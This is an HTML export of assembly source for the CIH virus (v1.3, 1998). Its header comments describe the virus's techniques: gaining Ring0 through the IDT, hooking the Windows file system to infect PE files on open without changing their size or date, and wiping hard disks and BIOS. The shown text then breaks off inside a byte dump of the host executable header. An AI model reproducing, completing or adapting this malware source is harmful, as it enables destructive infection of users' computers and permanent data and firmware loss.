<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; ****************************************************************************</span><span class="sc0">
</span><span class="sc1">; *         The Virus Program Information                        *</span><span class="sc0">
</span><span class="sc1">; ****************************************************************************</span><span class="sc0">
</span><span class="sc1">; *                                                                          *</span><span class="sc0">
</span><span class="sc1">; * Designer : CIH          Original Place : TTIT of Taiwan      *</span><span class="sc0">
</span><span class="sc1">; * Create Date : 04/26/1998    Now Version : 1.3                    *</span><span class="sc0">
</span><span class="sc1">; *     Modification Time : 05/24/1998                                       *</span><span class="sc0">
</span><span class="sc1">; *                                      *</span><span class="sc0">
</span><span class="sc1">; *==========================================================================*</span><span class="sc0">
</span><span class="sc1">; *         Modification History                                 *</span><span class="sc0">
</span><span class="sc1">; *==========================================================================*</span><span class="sc0">
</span><span class="sc1">; * v1.0    1. Create the Virus Program.                                 *</span><span class="sc0">
</span><span class="sc1">; *     2. The Virus Modifies IDT to Get Ring0 Privilege.            *</span><span class="sc0">
</span><span class="sc1">; * 04/26/1998  3. Virus Code doesn't Reload into System.                    *</span><span class="sc0">
</span><span class="sc1">; *     4. Call IFSMgr_InstallFileSystemApiHook to Hook File System. *</span><span class="sc0">
</span><span class="sc1">; *     5. Modifies Entry Point of IFSMgr_InstallFileSystemApiHook.  *</span><span class="sc0">
</span><span class="sc1">; *     6. When System Opens Existing PE File, the File will be      *</span><span class="sc0">
</span><span class="sc1">; *                Infected, and the File doesn't be Reinfected.             *</span><span class="sc0">
</span><span class="sc1">; *     7. It is also Infected, even the File is Read-Only.          *</span><span class="sc0">
</span><span class="sc1">; *     8. When the File is Infected, the Modification Date and Time *</span><span class="sc0">
</span><span class="sc1">; *        of the File also don't be Changed.                        *</span><span class="sc0">
</span><span class="sc1">; *     9. When My Virus Uses IFSMgr_Ring0_FileIO, it will not Call  *</span><span class="sc0">
</span><span class="sc1">; *        Previous FileSystemApiHook, it will Call the Function     *</span><span class="sc0">
</span><span class="sc1">; *        that the IFS Manager Would Normally Call to Implement     *</span><span class="sc0">
</span><span class="sc1">; *        this Particular I/O Request.                              *</span><span class="sc0">
</span><span class="sc1">; *        10. The Virus Size is only 656 Bytes.                         *</span><span class="sc0">
</span><span class="sc1">; *==========================================================================*</span><span class="sc0">
</span><span class="sc1">; * v1.1    1. Especially, the File that be Infected will not Increase   *</span><span class="sc0">
</span><span class="sc1">; *        it's Size...   ^__^                       *</span><span class="sc0">
</span><span class="sc1">; * 05/15/1998  2. Hook and Modify Structured Exception Handing.         *</span><span class="sc0">
</span><span class="sc1">; *        When Exception Error Occurs, Our OS System should be in   *</span><span class="sc0">
</span><span class="sc1">; *        Windows NT. So My Cute Virus will not Continue to Run,    *</span><span class="sc0">
</span><span class="sc1">; *        it will Jmup to Original Application to Run.          *</span><span class="sc0">
</span><span class="sc1">; *     3. Use Better Algorithm, Reduce Virus Code Size.         *</span><span class="sc0">
</span><span class="sc1">; *     4. The Virus "Basic" Size is only 796 Bytes.             *</span><span class="sc0">
</span><span class="sc1">; *==========================================================================*</span><span class="sc0">
</span><span class="sc1">; * v1.2    1. Kill All HardDisk, and BIOS... Super... Killer...         *</span><span class="sc0">
</span><span class="sc1">; *     2. Modify the Bug of v1.1                    *</span><span class="sc0">
</span><span class="sc1">; * 05/21/1998  3. The Virus "Basic" Size is 1003 Bytes.             *</span><span class="sc0">
</span><span class="sc1">; *==========================================================================*</span><span class="sc0">
</span><span class="sc1">; * v1.3    1. Modify the Bug that WinZip Self-Extractor Occurs Error.   *</span><span class="sc0">
</span><span class="sc1">; *        So When Open WinZip Self-Extractor ==&gt; Don't Infect it.   *</span><span class="sc0">
</span><span class="sc1">; * 05/24/1998  2. The Virus "Basic" Size is 1010 Bytes.             *</span><span class="sc0">
</span><span class="sc1">; ****************************************************************************</span><span class="sc0">
 
                </span><span class="sc2">.586P</span><span class="sc0">
 
</span><span class="sc1">; ****************************************************************************</span><span class="sc0">
</span><span class="sc1">; *             Original PE Executable File(Don't Modify this Section)       *</span><span class="sc0">
</span><span class="sc1">; ****************************************************************************</span><span class="sc0">
 
</span><span class="sc5">OriginalAppEXE</span><span class="sc0">  </span><span class="sc9">SEGMENT</span><span class="sc0">
 
</span><span class="sc5">FileHeader</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
